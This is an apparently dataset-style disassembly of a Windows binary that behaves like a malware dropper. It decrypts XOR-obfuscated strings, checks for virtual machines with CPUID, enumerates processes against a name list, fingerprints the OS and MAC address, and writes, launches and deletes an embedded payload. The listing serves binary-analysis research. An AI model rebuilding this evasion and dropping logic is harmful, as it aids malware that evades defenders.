sub_2001000
push ebp
lea ebp [ esp - 0x90 ]
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x8c ] eax
and [ ebp - 0x80 ] 0x0
push ebx
push edi
push 0x104
lea eax [ ebp - 0x7b ]
push 0x0
push eax
mov [ ebp - 0x7c ] 0x0
call sub_20039e0
add esp 0xc
mov ecx r--data
lea edi [ ebp - 0x7c ]
call sub_2001ab7
push 0x63
pop ebx
push [ ebp - 0x80 ]
call sub_2003e54
xor eax eax
pop ecx
inc eax
jmp r-xdata
inc ebx
cmp ebx 0x7a
jle r-xdata
mov ecx [ ebp + 0x8c ]
pop edi
xor ecx ebp
pop ebx
call sub_2003680
add ebp 0x90
leave
retn
push r--data
lea eax [ ebp - 0x7c ]
push eax
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x7c ] bl
call sub_2003983
add esp 0xc
cmp [ ebp - 0x80 ] 0x0
jne r-xdata
xor eax eax
sub_2001093
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x324
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x320 ] eax
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi 0x103
xor ebx ebx
push edi
lea eax [ esp + 0x15 ]
push ebx
push eax
mov [ esp + 0x1c ] bl
call sub_20039e0
add esp 0xc
push edi
lea eax [ esp + 0x225 ]
push ebx
push eax
mov [ esp + 0x22c ] bl
call sub_20039e0
add esp 0xc
push edi
lea eax [ esp + 0x11d ]
push ebx
push eax
mov [ esp + 0x124 ] bl
call sub_20039e0
add esp 0xc
call sub_20018a0
test eax eax
je r-xdata
xor eax eax
call sub_200178d
test eax eax
je r-xdata
call sub_2001000
test eax eax
jne r-xdata
mov [ esp + 0xc ] ebx
push eax
push ecx
mov eax 0x1
cpuid
mov [ esp + 0x14 ] ecx
pop ecx
pop eax
mov eax [ esp + 0xc ]
and eax 0x80000010
cmp eax 0x10
je r-xdata
call sub_200142c
test eax eax
je r-xdata
call sub_2001935
test eax eax
jne r-xdata
mov ecx r--data
lea edi [ esp + 0x10 ]
call sub_2001ab7
mov eax edi
push eax
xor edi edi
push edi
push edi
call [ CreateMutexA@IAT ]
mov [ esp + 0xc ] eax
cmp eax edi
je r-xdata
call sub_200159c
jmp r-xdata
push eax
call sub_2002d90
pop ecx
jmp r-xdata
push 0x104
lea eax [ esp + 0x11c ]
push eax
push edi
call [ GetModuleFileNameA@IAT ]
cmp esi edi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
push r--data
push esi
call sub_2003720
pop ecx
test eax eax
je r-xdata
push [ esp + 0xc ]
call [ CloseHandle@IAT ]
or eax 0xffffffff
jmp r-xdata
lea eax [ esp + 0x118 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_20037b0
lea eax [ esp + 0x18 ]
push r--data
push eax
call sub_20037c0
add esp 0x10
lea eax [ esp + 0x10 ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ecx r--data
lea edi [ esp + 0x220 ]
call sub_2001ab7
mov eax edi
push eax
lea eax [ esp + 0x11c ]
push eax
call sub_2003210
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
jmp r-xdata
mov ecx [ esp + 0x32c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_2003680
mov esp ebp
pop ebp
retn 0x10
call sub_2001330
lea eax [ esp + 0x118 ]
push eax
call sub_2002d90
cmp [ esp + 0x10 ] 0x0
pop ecx
je r-xdata
lea eax [ esp + 0x10 ]
push r--data
push eax
call sub_200396c
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
mov ecx r--data
lea edi [ esp + 0x220 ]
call sub_2001ab7
mov eax edi
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_2003d20
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_2003280
test eax eax
jne r-xdata
lea eax [ esp + 0x14 ]
push eax
call sub_20037b0
pop ecx
pop ecx
lea eax [ esp + 0x10 ]
push eax
call sub_2003720
mov ebx [ Sleep@IAT ]
pop ecx
test eax eax
je r-xdata
push [ esp + 0xc ]
call [ CloseHandle@IAT ]
push 0xc8
call ebx
lea eax [ esp + 0x10 ]
push eax
call [ DeleteFileA@IAT ]
push esi
push 0x778
push 0x1
push rw-data
call sub_2003cfa
push esi
call sub_2003e54
add esp 0x14
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x11c ]
push eax
push 0xc8
call ebx
push esi
call [ DeleteFileA@IAT ]
push r--data
push esi
jmp r-xdata
call sub_20037b0
pop ecx
pop ecx
sub_2001330
push ebp
mov ebp esp
sub esp 0x13c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x137 ]
push ebx
push eax
mov [ ebp - 0x138 ] bl
call sub_20039e0
add esp 0xc
push 0xa
pop ecx
xor eax eax
mov [ ebp - 0x30 ] bl
lea edi [ ebp - 0x2f ]
[ edi ]
call sub_2002710
mov [ ebp - 0x13c ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_2003680
leave
retn
push eax
call sub_2002b73
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
push [ ebp - 0x13c ]
call sub_200368f
pop ecx
mov ecx r--data
lea edi [ ebp - 0x138 ]
call sub_2001ab7
mov eax edi
push eax
mov eax esi
call sub_2002c92
pop ecx
cmp eax ebx
je r-xdata
mov ecx r--data
lea edi [ ebp - 0x138 ]
call sub_2001ab7
mov eax edi
push eax
mov eax esi
call sub_2002c92
mov edi eax
pop ecx
cmp edi ebx
je r-xdata
push rw-data
call eax
pop ecx
mov ecx r--data
lea edi [ ebp - 0x138 ]
call sub_2001ab7
mov eax edi
push eax
mov eax esi
call sub_2002c92
pop ecx
test eax eax
je r-xdata
lea ebx [ ebp - 0x30 ]
call sub_2002252
mov eax ebx
push eax
call edi
pop ecx
call sub_2002d1d
push 0x0
call eax
pop ecx
sub_200142c
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x3b4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x74 ] eax
push ebx
push esi
push edi
xor ebx ebx
push 0x3f
lea eax [ ebp - 0x1b ]
push ebx
push eax
mov [ ebp - 0x338 ] ebx
mov [ ebp - 0x1c ] bl
call sub_20039e0
push 0x3f
lea eax [ ebp + 0x25 ]
push ebx
push eax
mov [ ebp + 0x24 ] bl
call sub_20039e0
mov esi 0x104
push esi
lea eax [ ebp - 0x123 ]
push ebx
push eax
mov [ ebp - 0x124 ] bl
call sub_20039e0
push esi
lea eax [ ebp - 0x333 ]
push ebx
push eax
mov [ ebp - 0x334 ] bl
call sub_20039e0
push esi
lea eax [ ebp - 0x22b ]
push ebx
push eax
mov [ ebp - 0x22c ] bl
call sub_20039e0
mov [ ebp + 0x64 ] bl
xor eax eax
lea edi [ ebp + 0x65 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
add esp 0x3c
mov ecx r--data
lea edi [ ebp - 0x124 ]
call sub_2001ab7
mov ecx r--data
lea edi [ ebp - 0x334 ]
call sub_2001ab7
lea eax [ ebp - 0x33c ]
push eax
push 0x20019
push ebx
lea eax [ ebp - 0x124 ]
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov ecx r--data
lea edi [ ebp - 0x1c ]
call sub_2001ab7
mov ecx r--data
lea edi [ ebp + 0x24 ]
call sub_2001ab7
mov eax edi
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x22c ]
push eax
mov eax edi
push eax
lea esi [ ebp - 0x33c ]
call sub_2002530
pop ecx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x338 ]
lea eax [ ebp - 0x338 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call esi
mov ecx r--data
lea edi [ ebp + 0x64 ]
call sub_2001ab7
mov eax edi
push eax
lea eax [ ebp - 0x22c ]
push eax
call sub_2003d20
neg eax
pop ecx
sbb eax eax
pop ecx
neg eax
jmp r-xdata
mov ecx [ ebp + 0x74 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_2003680
add ebp 0x78
leave
retn
sub_200159c
push ebp
mov ebp esp
sub esp 0x504
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x18f ]
push ebx
push eax
mov [ ebp - 0x190 ] bl
call sub_20039e0
push 0x3f
lea eax [ ebp - 0x47 ]
push ebx
push eax
mov [ ebp - 0x48 ] bl
call sub_20039e0
push 0x3f
lea eax [ ebp - 0x87 ]
push ebx
push eax
mov [ ebp - 0x88 ] bl
call sub_20039e0
add esp 0x24
push 0x104
lea eax [ ebp - 0x4a0 ]
push eax
push ebx
mov [ ebp - 0x4a4 ] ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x4a0 ]
push eax
lea eax [ ebp - 0x398 ]
push eax
call sub_20037b0
lea eax [ ebp - 0x398 ]
push 0x5c
push eax
call sub_2003db0
mov ecx r--data
lea edi [ ebp - 0x190 ]
mov [ eax ] bl
call sub_2001ab7
mov eax edi
push eax
lea eax [ ebp - 0x398 ]
push eax
call sub_20037c0
add esp 0x18
mov ecx r--data
lea edi [ ebp - 0x48 ]
call sub_2001ab7
mov ecx r--data
lea edi [ ebp - 0x88 ]
call sub_2001ab7
mov eax edi
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov edi eax
lea eax [ ebp - 0x398 ]
push eax
call sub_20027a3
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_2003680
leave
retn
lea eax [ ebp - 0x398 ]
push eax
lea eax [ ebp - 0x190 ]
push eax
call sub_20037b0
lea eax [ ebp - 0x190 ]
push r--data
push eax
call sub_20037c0
add esp 0x10
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0xc0000000
lea eax [ ebp - 0x190 ]
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push ebx
lea eax [ ebp - 0x4a4 ]
push eax
push 0x778
push rw-data
push esi
call [ WriteFile@IAT ]
push esi
test eax eax
jne r-xdata
call [ CloseHandle@IAT ]
push 0x44
pop esi
push esi
lea eax [ ebp - 0x500 ]
push ebx
push eax
call sub_20039e0
push 0x10
lea eax [ ebp - 0x4b4 ]
push ebx
push eax
call sub_20039e0
lea eax [ ebp - 0x398 ]
push r--data
push eax
mov [ ebp - 0x500 ] esi
call sub_20037c0
lea eax [ ebp - 0x4a0 ]
push eax
lea eax [ ebp - 0x398 ]
push eax
call sub_20037c0
add esp 0x28
lea eax [ ebp - 0x4b4 ]
push eax
lea eax [ ebp - 0x500 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x398 ]
push eax
push ebx
call edi
call [ CloseHandle@IAT ]
jmp r-xdata
sub_200178d
push ebp
mov ebp esp
sub esp 0x174
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ecx r--data
lea edi [ ebp - 0x110 ]
call sub_2001ab7
mov eax edi
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx r--data
call sub_2001ab7
mov eax edi
push eax
push esi
call [ GetProcAddress@IAT ]
mov [ ebp - 0x114 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_2003680
leave
retn
push 0x44
pop esi
push esi
lea eax [ ebp - 0x170 ]
push ebx
push eax
call sub_20039e0
push 0x5
pop eax
push 0x10
mov [ ebp - 0x140 ] ax
lea eax [ ebp - 0x124 ]
push ebx
push eax
mov [ ebp - 0x170 ] esi
mov [ ebp - 0x144 ] 0x1
call sub_20039e0
add esp 0x18
push 0x104
lea eax [ ebp - 0x110 ]
push eax
call [ GetSystemDirectoryA@IAT ]
mov edi [ lstrlenA@IAT ]
lea eax [ ebp - 0x110 ]
lea esi [ ebp - 0x110 ]
push eax
dec esi
call edi
cmp [ eax + esi ] 0x5c
jne r-xdata
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x170 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x110 ]
push eax
call [ ebp - 0x114 ]
call [ GetLastError@IAT ]
sub eax 0x5
neg eax
sbb eax eax
inc eax
lea eax [ ebp - 0x110 ]
push eax
call edi
mov [ eax + esi ] bl
sub_20018a0
push ebp
lea ebp [ esp - 0x18c ]
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x188 ] eax
push ebx
push esi
push edi
mov esi 0x103
xor ebx ebx
push esi
lea eax [ ebp - 0x7f ]
push ebx
push eax
mov [ ebp - 0x80 ] bl
call sub_20039e0
push esi
lea eax [ ebp + 0x85 ]
push ebx
push eax
mov [ ebp + 0x84 ] bl
call sub_20039e0
add esp 0x18
mov ecx r--data
lea edi [ ebp + 0x84 ]
call sub_2001ab7
push 0x104
lea eax [ ebp - 0x80 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax edi
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_2003210
pop ecx
pop ecx
mov ecx [ ebp + 0x188 ]
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
inc eax
pop ebx
call sub_2003680
add ebp 0x18c
leave
retn
sub_2001935
push ebp
mov ebp esp
sub esp 0x784
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
push 0x778
mov ecx rw-data
lea edi [ ebp - 0x780 ]
call sub_2001b45
xor eax eax
cmp [ ebp - 0x6c0 ] al
pop ecx
mov ecx [ ebp - 0x4 ]
setne al
xor ecx ebp
pop edi
call sub_2003680
leave
retn
sub_2001977
push edi
mov edi ecx
test edi edi
je r-xdata
pop edi
retn
cmp eax 0x17
ja r-xdata
mov [ edi ] 0x0
jmp [ eax * 4 + jump_table_2001a57 ]
mov ecx r--data
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
mov ecx r--data
jmp r-xdata
call sub_2001ab7
pop edi
retn
sub_2001ab7
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x74 ] eax
push esi
push 0x7f
lea eax [ ebp - 0xb ]
push 0x0
push eax
mov esi ecx
mov [ ebp - 0xc ] 0x0
call sub_20039e0
push esi
call sub_2003720
push eax
push esi
push edi
mov [ ebp - 0x10 ] eax
call sub_2003ed0
mov esi r--data
lea eax [ ebp - 0xc ]
push esi
push eax
call sub_20037b0
push esi
call sub_2003720
add esp 0x28
xor ecx ecx
cmp [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] eax
pop esi
jle r-xdata
mov [ edi + ecx ] 0x0
mov ecx [ ebp + 0x74 ]
xor ecx ebp
call sub_2003680
add ebp 0x78
leave
retn
push ebx
inc ecx
cmp ecx [ ebp - 0x10 ]
jl r-xdata
xor dl bl
mov [ edi + ecx ] dl
mov eax ecx
cdq
idiv [ ebp - 0x14 ]
mov bl [ edi + ecx ]
mov dl [ ebp + edx - 0xc ]
cmp bl dl
je r-xdata
pop ebx
sub_2001b45
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x7f
lea eax [ ebp - 0x83 ]
push 0x0
push eax
mov esi ecx
mov [ ebp - 0x84 ] 0x0
call sub_20039e0
push [ ebp + 0x8 ]
push esi
push edi
call sub_2003ed0
mov esi r--data
lea eax [ ebp - 0x84 ]
push esi
push eax
call sub_20037b0
push esi
call sub_2003720
xor ecx ecx
add esp 0x24
mov [ ebp - 0x88 ] eax
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_2003680
leave
retn
push ebx
inc ecx
cmp ecx [ ebp + 0x8 ]
jb r-xdata
xor edx edx
mov eax ecx
div [ ebp - 0x88 ]
movzx esi bl
mov dl [ ebp + edx - 0x84 ]
movsx eax dl
cmp esi eax
je r-xdata
mov bl [ edi + ecx ]
test bl bl
je r-xdata
pop ebx
xor dl bl
mov [ edi + ecx ] dl
sub_2001be0
push ebp
lea ebp [ esp - 0x2c4 ]
sub esp 0x344
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2c0 ] eax
mov eax [ ebp + 0x2cc ]
push ebx
mov [ ebp - 0x80 ] eax
mov eax [ ebp + 0x2d0 ]
push esi
push edi
mov [ ebp - 0x7c ] eax
xor eax eax
xor ebx ebx
push 0x103
mov [ ebp + 0x2b8 ] ax
mov [ ebp + 0x2ba ] ax
mov [ ebp + 0x2bc ] ax
mov [ ebp + 0x2be ] ax
lea eax [ ebp + 0x1a5 ]
push ebx
push eax
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x70 ] ebx
mov [ ebp + 0x1a4 ] bl
call sub_20039e0
mov esi 0x104
push esi
lea eax [ ebp + 0x9d ]
push ebx
push eax
mov [ ebp + 0x9c ] bl
call sub_20039e0
push esi
lea eax [ ebp - 0x6b ]
push ebx
push eax
mov [ ebp - 0x6c ] bl
call sub_20039e0
add esp 0x24
mov ecx r--data
lea edi [ ebp + 0x9c ]
call sub_2001ab7
mov eax edi
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x2c0 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_2003680
add ebp 0x2c4
leave
retn
mov ecx r--data
lea edi [ ebp - 0x6c ]
call sub_2001ab7
mov eax edi
push eax
push esi
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x78 ]
push eax
push ebx
call esi
cmp eax 0x6f
jne r-xdata
mov esi [ ebp - 0x70 ]
push [ ebp - 0x78 ]
call sub_20046f8
pop ecx
lea ecx [ ebp - 0x78 ]
push ecx
push eax
mov [ ebp - 0x70 ] eax
call esi
test eax eax
je r-xdata
mov esi [ esi ]
cmp esi ebx
jne r-xdata
cmp [ eax ] 0x30
jne r-xdata
mov esi [ ebp - 0x80 ]
push 0x11
push 0x30
push esi
call sub_20039e0
mov edi [ ebp - 0x7c ]
push 0x8
push 0x30
push edi
call sub_20039e0
push [ ebp - 0x70 ]
mov [ esi + 0x11 ] bl
mov [ edi + 0x8 ] bl
call sub_200368f
add esp 0x1c
jmp r-xdata
lea eax [ esi + 0x1b0 ]
cmp eax ebx
je r-xdata
mov esi [ ebp - 0x70 ]
lea eax [ esi + 0x1b0 ]
push eax
lea eax [ ebp + 0x2a8 ]
push eax
call sub_20037b0
mov edi r--data
lea eax [ ebp + 0x2a8 ]
push edi
push eax
mov [ ebp - 0x74 ] ebx
call sub_2004877
add esp 0x10
jmp r-xdata
cmp eax ebx
jne r-xdata
push eax
call sub_200486c
pop ecx
mov ecx [ ebp - 0x74 ]
inc [ ebp - 0x74 ]
cmp [ ebp - 0x74 ] 0x4
mov [ ebp + ecx * 2 + 0x2b8 ] ax
jg r-xdata
mov ecx r--data
lea edi [ ebp + 0x1a4 ]
call sub_2001ab7
movzx eax [ esi + 0x199 ]
push eax
movzx eax [ esi + 0x198 ]
push eax
movzx eax [ esi + 0x197 ]
push eax
movzx eax [ esi + 0x196 ]
push eax
movzx eax [ esi + 0x195 ]
push eax
movzx eax [ esi + 0x194 ]
push eax
mov eax edi
push eax
push [ ebp - 0x80 ]
call sub_200441c
mov ecx r--data
call sub_2001ab7
movsx eax [ ebp + 0x2be ]
push eax
movsx eax [ ebp + 0x2bc ]
push eax
movsx eax [ ebp + 0x2ba ]
push eax
movsx eax [ ebp + 0x2b8 ]
push eax
mov eax edi
push eax
push [ ebp - 0x7c ]
call sub_200441c
push [ ebp - 0x70 ]
call sub_200368f
add esp 0x3c
push edi
push ebx
call sub_2004877
pop ecx
pop ecx
sub_2001e22
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x144
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x74 ] eax
push ebx
push edi
xor ebx ebx
push 0x3f
lea eax [ ebp - 0xb ]
push ebx
push eax
mov [ ebp - 0xc ] bl
call sub_20039e0
push 0x3f
lea eax [ ebp + 0x35 ]
push ebx
push eax
mov [ ebp + 0x34 ] bl
call sub_20039e0
mov edi 0x9c
push edi
lea eax [ ebp - 0xa8 ]
push ebx
push eax
call sub_20039e0
add esp 0x24
lea eax [ ebp - 0xa8 ]
push eax
mov [ ebp - 0xa8 ] edi
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x74 ]
pop edi
xor ecx ebp
pop ebx
call sub_2003680
add ebp 0x78
leave
retn
mov eax [ ebp - 0xa4 ]
sub eax 0x4
je r-xdata
cmp [ ebp - 0xa0 ] 0x5a
sete al
lea eax [ eax * 4 + 0x4 ]
dec eax
je r-xdata
lea ecx [ ebp - 0xcc ]
push ecx
call eax
lea eax [ ebp - 0xcc ]
push eax
call [ GetSystemInfo@IAT ]
jmp r-xdata
cmp [ ebp - 0xa0 ] ebx
jne r-xdata
dec eax
je r-xdata
or [ esi ] 0x1
cmp [ ebp - 0xcc ] 0x6
jne r-xdata
cmp [ ebp - 0xcc ] 0x9
je r-xdata
cmp [ ebp - 0xa0 ] 0x1
jne r-xdata
mov [ esi ] 0xc
jmp r-xdata
mov eax [ ebp - 0xa0 ]
cmp eax ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp - 0xa0 ] 0x2
jne r-xdata
mov [ esi ] 0x10
jmp r-xdata
mov ecx r--data
lea edi [ ebp - 0xc ]
call sub_2001ab7
mov ecx r--data
lea edi [ ebp + 0x34 ]
call sub_2001ab7
push 0x24
lea eax [ ebp - 0xcc ]
push ebx
push eax
call sub_20039e0
add esp 0xc
mov eax edi
push eax
lea eax [ ebp - 0xc ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0xe ] 0x1
setne al
lea eax [ eax * 4 + 0x18 ]
jmp r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0xe ] al
sete al
dec al
and al 0xfd
add al 0x20
jmp r-xdata
mov [ esi ] al
cmp [ ebp - 0xe ] 0x1
setne al
dec al
and al 0xfd
add al 0x14
jmp r-xdata
mov [ esi ] 0x15
jmp r-xdata
cmp eax 0x3
jne r-xdata
cmp [ ebp - 0xe ] 0x1
jne r-xdata
cmp [ ebp - 0xe ] 0x1
jne r-xdata
mov [ esi ] 0x24
jmp r-xdata
mov [ esi ] 0x26
jmp r-xdata
sub_2001fd1
push ebp
mov ebp esp
mov eax 0x1368
call sub_200e210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0xeff
mov [ ebp - 0x1364 ] eax
xor edi edi
lea eax [ ebp - 0x1223 ]
push edi
push eax
mov [ ebp - 0x1224 ] 0x0
call sub_20039e0
mov esi 0x104
push esi
lea eax [ ebp - 0x21b ]
push edi
push eax
mov [ ebp - 0x21c ] 0x0
call sub_20039e0
push esi
lea eax [ ebp - 0x113 ]
push edi
push eax
mov [ ebp - 0x114 ] 0x0
call sub_20039e0
add esp 0x24
mov ecx r--data
lea edi [ ebp - 0x21c ]
call sub_2001ab7
mov ecx r--data
lea edi [ ebp - 0x114 ]
call sub_2001ab7
mov esi [ GetModuleHandleA@IAT ]
mov eax edi
push eax
lea eax [ ebp - 0x21c ]
push eax
call esi
mov ebx [ GetProcAddress@IAT ]
push eax
call ebx
mov [ ebp - 0x1358 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_2003680
leave
retn
mov ecx r--data
call sub_2001ab7
mov eax edi
push eax
lea eax [ ebp - 0x21c ]
push eax
call esi
push eax
call ebx
mov [ ebp - 0x1368 ] eax
test eax eax
je r-xdata
and [ ebp - 0x1350 ] 0x0
lea eax [ ebp - 0x1224 ]
mov [ ebp - 0x1354 ] eax
mov esi r--data
mov edi 0xa0
inc [ ebp - 0x1350 ]
mov eax [ ebp - 0x1350 ]
add [ ebp - 0x1354 ] edi
cmp eax 0x18
mov [ ebp - 0x1360 ] eax
jl r-xdata
mov ebx [ ebp - 0x1354 ]
mov eax [ ebp - 0x1350 ]
lea ecx [ ebp - 0x324 ]
call sub_2001977
lea eax [ ebp - 0x324 ]
push esi
push eax
call sub_2004877
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov [ ebp - 0x135c ] eax
cmp eax 0xffffffff
je r-xdata
push eax
push ebx
call sub_20037b0
push esi
push 0x0
call sub_2004877
add esp 0x10
add ebx 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0x134c ]
push eax
push [ ebp - 0x135c ]
mov [ ebp - 0x134c ] 0x128
call [ ebp - 0x1358 ]
jmp r-xdata
test eax eax
jne r-xdata
and [ ebp - 0x1350 ] 0x0
cmp [ ebp - 0x1360 ] 0x0
jle r-xdata
push [ ebp - 0x135c ]
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x134c ]
push eax
push [ ebp - 0x135c ]
mov [ ebp - 0x134c ] 0x128
call [ ebp - 0x1368 ]
lea eax [ ebp - 0x1224 ]
mov [ ebp - 0x1358 ] eax
mov ebx eax
inc [ ebp - 0x1350 ]
mov eax [ ebp - 0x1350 ]
add [ ebp - 0x1358 ] edi
add ebx edi
cmp eax [ ebp - 0x1360 ]
jl r-xdata
mov esi [ ebp - 0x1358 ]
mov [ ebp - 0x1354 ] ebx
push ebx
call sub_2003720
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1364 ]
push 0x17
xor edx edx
pop ecx
sub ecx [ ebp - 0x1350 ]
inc edx
shl edx cl
or [ eax ] edx
add esi 0x10
push esi
mov [ ebp - 0x1354 ] esi
call sub_2003720
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0x1354 ]
call sub_2003720
push eax
push [ ebp - 0x1354 ]
lea eax [ ebp - 0x1328 ]
push eax
call sub_200458b
add esp 0x10
test eax eax
je r-xdata
jmp r-xdata
sub_2002252
push ebp
mov ebp esp
sub esp 0x2d8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
push esi
push edi
mov [ ebp - 0x18 ] 0x0
lea edi [ ebp - 0x17 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov [ ebp - 0x34 ] 0x0
lea edi [ ebp - 0x33 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov [ ebp - 0x24 ] 0x0
lea edi [ ebp - 0x23 ]
stosd [ edi ]
stosd [ edi ]
push 0x3f
stosb [ edi ]
xor esi esi
lea eax [ ebp - 0x77 ]
push esi
push eax
mov [ ebp - 0x78 ] 0x0
call sub_20039e0
add esp 0xc
push 0x104
lea eax [ ebp - 0x2c7 ]
push esi
push eax
mov [ ebp - 0x2d0 ] esi
mov [ ebp - 0x2c8 ] 0x0
call sub_20039e0
add esp 0xc
push 0x103
lea eax [ ebp - 0x1bf ]
push esi
push eax
mov [ ebp - 0x1c0 ] 0x0
call sub_20039e0
add esp 0xc
cmp ebx esi
jne r-xdata
mov ecx r--data
lea edi [ ebp - 0x2c8 ]
call sub_2001ab7
mov ecx r--data
lea edi [ ebp - 0x1c0 ]
call sub_2001ab7
mov eax edi
push eax
lea eax [ ebp - 0x2c8 ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
lea esi [ ebp - 0x2c9 ]
mov [ ebp - 0x2d8 ] eax
call sub_2001e22
call sub_20035f0
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ ebp - 0x2c9 ]
shl eax 0x18
mov [ ebp - 0x2d4 ] eax
lea eax [ ebp - 0x2d4 ]
push eax
call sub_2001fd1
pop ecx
mov ecx r--data
lea edi [ ebp - 0x1c0 ]
call sub_2001ab7
call [ ebp - 0x2d8 ]
movzx eax ax
push eax
mov eax edi
push eax
lea eax [ ebp - 0x24 ]
push eax
